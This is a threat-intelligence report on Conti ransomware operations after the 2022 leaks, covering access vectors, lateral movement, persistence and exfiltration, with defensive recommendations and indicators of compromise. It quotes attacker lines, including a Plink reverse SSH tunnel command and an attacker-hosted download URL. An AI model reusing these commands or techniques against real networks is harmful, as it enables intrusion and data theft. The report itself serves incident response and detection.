<div>
<h1 class="entry-title">Conti-nuation: methods and techniques observed in operations post the leaks</h1>
<a href="https://research.nccgroup.com/author/nccgifc/" rel="author" title="Posts by RIFT: Research and Intelligence Fusion Team">RIFT: Research and Intelligence Fusion Team</a>
<a href="https://research.nccgroup.com/category/threat-intelligence/" rel="category tag">Threat Intelligence</a> 
March 31, 2022March 31, 2022 
5 Minutes 
<p>Authored by: Nikolaos Pantazopoulos, Alex Jessop and Simon Biggs</p>
<h2>Executive Summary</h2>
<p>In February 2022, a Twitter account which uses the handle ‘ContiLeaks’, started to publicly release information for the operations of the cybercrime group behind the Conti ransomware. The leaked data included private conversations between members along with source code of various panels and tools (e.g. Team9 backdoor panel [1]). Furthermore, even though the leaks appeared to have a focus on the people behind the Conti operations, the leaked data confirmed (at least to the public domain) that the Conti operators are part of the group, which operates under the ‘TheTrick’ ecosystem. For the past few months, there was a common misconception that Conti was a different entity.</p>
<p>Despite the public disclosure of their arsenal, it appears that Conti operators continue their business as usual by proceeding to compromise networks, exfiltrating data and finally deploying their ransomware. This post describes the methods and techniques we observed during recent incidents that took place after the Conti data leaks.</p>
<p>Our findings can be summarised as below:</p>
<ul><li>Multiple different initial access vectors have been observed.</li><li>The operator(s) use service accounts of the victim’s Antivirus product in order to laterally move through the estate and deploy the ransomware.</li><li>After getting access, the operator(s) attempted to remove the installed Antivirus product through the execution of batch scripts.</li><li>To achieve persistence in the compromised hosts, multiple techniques were observed;<ul><li>Service created for the execution of Cobalt Strike.</li></ul><ul><li>Multiple legitimate remote access software, ‘AnyDesk’, ‘Splashtop’ and ‘Atera’, were deployed. (Note: This has been reported in the past too by different vendors)<ul><li>Local admin account ‘Crackenn’ created. (Note: This has been previously reported by Truesec as a Conti behaviour [2])</li></ul></li></ul></li><li>Before starting the ransomware activity, the operators exfiltrated data from the network with the legitimate software ‘Rclone’ [3].</li></ul>
<p>It should be noted that the threat actor(s) might use different tools or techniques in some stages of the compromise.</p>
<h2>Initial Access</h2>
<p>Multiple initial access vectors have been observed recently; phishing emails and the exploitation of Microsoft Exchange servers. The phishing email delivered to an employer proceeded to deploy Qakbot to the users Citrix session. The targeting of Microsoft Exchange saw ProxyShell and ProxyLogon vulnerabilities exploited. When this vector was observed, the compromise of the Exchange servers often took place two – three months prior to the post exploitation phase. This behaviour suggests that the team responsible for gaining initial access compromised a large number of estates in a small timeframe. </p>
<p>With a number of engagements, it was not possible to ascertain the initial access due to dwell time and evidence retention. However, other initial access vectors utilised by the Conti operator(s) are:</p>
<ul><li>Credential brute-force</li><li>Use of publicly available exploits. We have observed the following exploits being used:<ul><li>Fortigate VPN<ul><li>CVE-2018-13379</li></ul><ul><li>CVE-2018-13374</li></ul></li></ul><ul><li>Log4Shell<ul><li>CVE-2021-44228</li></ul></li></ul></li><li>Phishing e-mail sent by a legitimate compromised account.</li></ul>
<h2>Lateral Movement</h2>
<p>In one incident, after gaining access to the first compromised host, we observed the threat actor carrying out the following actions:</p>
<ul><li>Download AnyDesk from hxxps://37.221.113[.]100/anydesk.exe</li><li>Deployment of the following batch files:<ul><li>1.bat, 2.bat, 111.bat<ul><li>Ransomware propagation</li></ul></li></ul><ul><li>Removesophos.bat, uninstallSophos.bat<ul><li>Uninstalls Sophos Antivirus solution</li></ul></li></ul><ul><li>Aspx.bat<ul><li>Contains a command-line, which executes the dropped executable file ‘ekern.exe’.</li></ul><ul><li>‘ekern.exe’ is a command line connection tool known as Plink [4]</li></ul><ul><li>This file establishes a reverse SSH tunnel that allows direct RDP connection to the compromised host.</li></ul><ul><li>ekern.exe -ssh -P 53 -l redacted-pw redacted -R REDACTED_IP:59000:127.0.0.1:3389</li></ul></li></ul></li></ul>
<p>After executing the above files, we observed the following utilities being used for reconnaissance and movement:</p>
<ul><li>RDP</li><li>ADFind</li><li>Bloodhound to identify the network topology.</li><li>netscan.exe for network shares discovery.</li><li>Cobalt Strike deployed allowing the threat actor to laterally move throughout the network.</li></ul>
<p>The common techniques across the multiple Conti engagements are the use of RDP and Cobalt Strike.</p>
<h2>Persistence</h2>
<p>The threat actor leveraged Windows services to add persistence for the Cobalt Strike beacon. The primary persistence method was a Windows service, an example can be observed below:</p>
<p>A service was installed in the system.</p>
<p>Service Name: REDACTED</p>
<p>Service File Name: cmd.exe /c C:\ProgramData\1.msi</p>
<p>Service Type: user mode service</p>
<p>Service Start Type: demand start</p>
<p>Service Account: LocalSystem</p>
<p>In addition, services were also installed to provide persistence for the Remote Access Tools deployed by the threat actor:</p>
<ul><li>AnyDesk</li><li>Splashtop</li><li>Atera</li></ul>
<p>Another Conti engagement saw no methods of persistence. However, a temporary service was created to execute Cobalt Strike. It is hypothesized that the threat actor planned to achieve their objective quickly and therefore used services for execution rather than persistence.</p>
<p>In a separate engagement, where the initial access vector was phishing and lead to the deployment of Qakbot, the threat actor proceeded to create a local admin account named ‘Crackenn’ for persistence on the host. </p>
<h2>Privilege Escalation</h2>
<p>Conti operator(s) managed to escalate their privileges by compromising and using different accounts that were found in the compromised host. The credentials compromised in multiple engagements was achieved by deploying tools such as Mimikatz.</p>
<p>One operator was also observed exploiting ZeroLogon to obtain credentials and move laterally.</p>
<h2>Exfiltration and Encryption</h2>
<p>Similar to many other threat actors, Conti operator(s) exfiltrate a large amount of data from the compromised network using the legitimate software ‘Rclone’. ‘Rclone’ was configured to upload to either Mega cloud storage provider or to a threat actor controlled server. Soon after the data exfiltration, the threat actor(s) started the data encryption. In addition, we estimate that the average time between the lateral movement and encryption is five days.</p>
<p>As discussed earlier on, the average dwell time of a Conti compromise is heavily dependant on the initial access method. Those incidents that have involved ProxyShell and ProxyLogon, the time between initial access and lateral movement has been three – six months. However once lateral movement is conducted, time to completing their objective is a matter of days. </p>
<h2>Recommendations</h2>
<ul><li>Monitor firewalls for traffic categorised as filesharing</li><li>Monitor firewalls for anomalous spikes in data leaving the network</li><li>Patch externally facing services immediately</li><li>Monitor installed software for remote access tools</li><li>Restrict RDP and SMB access between hosts</li><li>Implement a Robust Password Policy [5]</li><li>Provide regular security awareness training</li></ul>
<h2>Indicators of Compromise</h2>
<figure class="wp-block-table"><table class="has-fixed-layout"><tbody><tr><td>Indicator Value</td><td>Indicator Type</td><td>Description</td></tr><tr><td>37.221.113[.]100/anydesk.exe</td><td>IP Address</td><td>Hosts AnyDesk</td></tr><tr><td>103.253.208[.]79</td><td>IP Address</td><td>Cobalt Strike command-and-control server</td></tr><tr><td>C:\ProgramData\1.msi</td><td>Filename</td><td>Cobalt Strike payload</td></tr><tr><td>C:\ProgramData\1.dll</td><td>Filename</td><td>Cobalt Strike payload</td></tr><tr><td>223.29.205[.]54</td><td>IP Address</td><td>AnyDesk IP address of the operator.</td></tr><tr><td>C:\Windows\sv.exe</td><td>Filename</td><td>Rclone</td></tr><tr><td>C:\Windows\svchost.conf</td><td>Filename</td><td>Rclone config</td></tr><tr><td>E03AF25994222D4DC6EFD98AE65217A03A5B40EEDCFFAC45F098E2A6F68F3F41</td><td>SHA256</td><td>Sv.exe – Rclone</td></tr><tr><td>C:\Users\Public\Report_18.xls</td><td>Filename</td><td>Cobalt Strike payload</td></tr><tr><td>C:\Users\Public\x86_16.dll</td><td>Filename</td><td>Cobalt Strike payload</td></tr><tr><td>Crackenn</td><td>Account</td><td>Local admin account created on patient zero</td></tr><tr><td>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Abevi\&lt;random characters&gt;.dll</td><td>Filename</td><td>Qakbot payload</td></tr><tr><td>C:\Users\Public\AdFind.exe</td><td>Filename</td><td>ADFind</td></tr><tr><td>23.82.140[.]234</td><td>IP Address</td><td>Cobalt Strike command-and-control server</td></tr><tr><td>23.81.246[.]179</td><td>IP Address</td><td>Cobalt Strike command-and-control server</td></tr><tr><td>hijelurusa[.]com</td><td>Domain</td><td>Cobalt Strike command-and-control server</td></tr></tbody></table></figure>
<h2>References</h2>
<ol type="1"><li><a href="https://www.bleepingcomputer.com/news/security/conti-ransomware-source-code-leaked-by-ukrainian-researcher/">https://www.bleepingcomputer.com/news/security/conti-ransomware-source-code-leaked-by-ukrainian-researcher/</a></li><li><a href="https://www.truesec.com/hub/blog/proxyshell-qbot-and-conti-ransomware-combined-in-a-series-of-cyber-attacks">https://www.truesec.com/hub/blog/proxyshell-qbot-and-conti-ransomware-combined-in-a-series-of-cyber-attacks</a></li><li><a href="https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/">https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/</a></li><li><a href="https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html">https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html</a></li><li><a href="https://www.ncsc.gov.uk/collection/passwords/updating-your-approach">https://www.ncsc.gov.uk/collection/passwords/updating-your-approach</a></li></ol>
<p></p>
<h3 class="sd-title">Share this:</h3><ul><li class="share-twitter"><a class="share-twitter sd-button share-icon" href="https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks/?share=twitter&amp;nb=1" rel="nofollow noopener noreferrer" target="_blank" title="Click to share on Twitter">Twitter</a></li><li class="share-reddit"><a class="share-reddit sd-button share-icon" href="https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks/?share=reddit&amp;nb=1" rel="nofollow noopener noreferrer" target="_blank" title="Click to share on Reddit">Reddit</a></li><li class="share-linkedin"><a class="share-linkedin sd-button share-icon" href="https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks/?share=linkedin&amp;nb=1" rel="nofollow noopener noreferrer" target="_blank" title="Click to share on LinkedIn">LinkedIn</a></li><li class="share-facebook"><a class="share-facebook sd-button share-icon" href="https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks/?share=facebook&amp;nb=1" rel="nofollow noopener noreferrer" target="_blank" title="Click to share on Facebook">Facebook</a></li><li class="share-end"></li></ul><h3 class="sd-title">Like this:</h3>Like Loading...<a class="sd-link-color"></a>
<img alt="" class="avatar avatar-80 photo jetpack-lazy-image grav-hashed grav-hijack" height="80" id="grav-8875243b6c0f6a934366d0278ee52700-0" src="https://secure.gravatar.com/avatar/8875243b6c0f6a934366d0278ee52700?s=80&amp;d=identicon&amp;r=g" width="80"/><img alt="" class="avatar avatar-80 photo" height="80" src="https://secure.gravatar.com/avatar/8875243b6c0f6a934366d0278ee52700?s=80&amp;d=identicon&amp;r=g" width="80"/>
<h2 class="author-title">Published by RIFT: Research and Intelligence Fusion Team</h2>
<p>
			RIFT leverages our strategic analysis, data science, and threat hunting capabilities to create actionable threat intelligence, ranging from IoCs and detection capabilities to strategic reports on tomorrow’s threat landscape. Cyber security is an arms race where both attackers and defenders continually update and improve their tools and ways of working. To ensure that our managed services remain effective against the latest threats, NCC Group operates a Global Fusion Center with Fox-IT at its core. This multidisciplinary team converts our leading cyber threat intelligence into powerful detection strategies.			<a class="author-link" href="https://research.nccgroup.com/author/nccgifc/" rel="author">
				View all posts by RIFT: Research and Intelligence Fusion Team			</a>
</p>
Published
March 31, 2022March 31, 2022 
</div>